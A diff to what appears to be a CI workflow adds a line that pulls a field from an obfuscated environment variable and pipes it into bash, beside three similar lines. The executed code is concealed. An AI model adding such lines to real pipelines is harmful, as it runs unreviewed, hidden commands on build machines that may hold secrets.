@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$du37" | jq -r .mkdb58 | /bin/bash
           echo $nunxb2 | jq -r .ae79477 | /bin/bash
           echo $asvnv8001 | jq -r .ton75 | /bin/bash
+          echo $fi070 | jq -r .bzo73 | /bin/bash
 
       - name: Save archive
         if: always()
